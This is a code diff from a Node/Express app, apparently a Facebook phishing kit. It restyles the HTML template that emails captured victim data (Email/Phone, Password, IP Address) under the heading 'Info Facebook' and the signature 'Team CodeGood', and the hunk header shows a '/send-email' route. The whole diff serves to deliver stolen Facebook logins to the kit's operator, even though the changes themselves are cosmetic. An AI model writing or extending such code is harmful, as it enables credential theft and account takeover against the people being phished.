@@ -67,52 +67,72 @@ app.post('/send-email', async (req, res) => {
 // ====================== TEMPLATE AUTO ======================
 function generateHtml(noperess, password, ipress) {
   return `
-  <html lang="en">
+  <!DOCTYPE html>
+  <html>
   <head>
-    <meta charset="UTF-8" />
     <title>Info Facebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <style type="text/css">
+      body {
+        font-family: "Helvetica", Arial, sans-serif;
+        width: 90%;
+        display: block;
+        margin: auto;
+        border: 1px solid #fff;
+        background: #fff;
+      }
+      .result {
+        width: 100%;
+        height: 100%;
+        display: block;
+        margin: auto;
+        border-radius: 10px;
+      }
+      .tblResult {
+        width: 100%;
+        border-collapse: collapse;
+        text-align: center;
+        background: #fcfcfc;
+      }
+      .tblResult th {
+        font-size: 1em;
+        padding: 15px 10px;
+        background: #001240;
+        border: 2px solid #001240;
+        color: #fff;
+        text-align: center;
+      }
+      .tblResult td {
+        font-size: 1em;
+        padding: 10px;
+        border: 2px solid #001240;
+        font-weight: bold;
+        color: #000;
+        text-align: center;
+      }
+    </style>
   </head>
-  <body style="background:#fff; font-family: Arial, sans-serif; margin:0; padding:20px;">
-    <div style="max-width:600px; margin:auto; border-radius:8px; background:#fff;">
-      <table width="100%" cellpadding="0" cellspacing="0" border="1" style="border-collapse:collapse; background:#f9f9f9; color:#000;">
-        <thead>
-          <tr>
-            <th colspan="3" style="background:#001240; color:#fff; text-align:center; padding:15px; font-size:18px; font-weight:bold;">
-              Info Facebook
-            </th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td style="border:1px solid #001240; padding:10px; font-weight:bold;">Email/Phone</td>
-            <td style="border:1px solid #001240; padding:10px; text-align:center; font-weight:bold;">${noperess}</td>
-            <td style="border:1px solid #001240;"></td>
-          </tr>
-          <tr>
-            <td style="border:1px solid #001240; padding:10px; font-weight:bold;">Password</td>
-            <td style="border:1px solid #001240; padding:10px; text-align:center; font-weight:bold;">${password}</td>
-            <td style="border:1px solid #001240;"></td>
-          </tr>
-          <tr>
-            <td style="border:1px solid #001240; padding:10px; font-weight:bold;">IP Address</td>
-            <td style="border:1px solid #001240; padding:10px; text-align:center; font-weight:bold;">${ipress}</td>
-            <td style="border:1px solid #001240;"></td>
-          </tr>
-        </tbody>
-        <tfoot>
-          <tr>
-            <td colspan="3" style="background:#001240; text-align:center; padding:15px;">
-              <a href="https://instagram.com/your_instagram_link" target="_blank" style="margin:0 10px; color:#fff; text-decoration:none; font-size:14px;">Instagram</a>
-              <a href="https://t.me/your_telegram_link" target="_blank" style="margin:0 10px; color:#fff; text-decoration:none; font-size:14px;">Telegram</a>
-              <a href="https://wa.me/your_whatsapp_number" target="_blank" style="margin:0 10px; color:#fff; text-decoration:none; font-size:14px;">WhatsApp</a>
-            </td>
-          </tr>
-          <tr>
-            <td colspan="3" style="background:#f1f1f1; text-align:center; padding:10px; font-size:12px; color:#555;">
-              © Team CodeGood 💤
-            </td>
-          </tr>
-        </tfoot>
+  <body>
+    <div class="result">
+      <table class="tblResult">
+        <tr>
+          <th colspan="3">Info Facebook</th>
+        </tr>
+        <tr>
+          <td style="border-right: none;">Email/Phone</td>
+          <td>${noperess}</td>
+        </tr>
+        <tr>
+          <td style="border-right: none;">Password</td>
+          <td>${password}</td>
+        </tr>
+        <tr>
+          <td style="border-right: none;">IP Address</td>
+          <td>${ipress}</td>
+        </tr>
+        <tr>
+          <th colspan="3">&copy; Team CodeGood 💤</th>
+        </tr>
       </table>
     </div>
   </body>
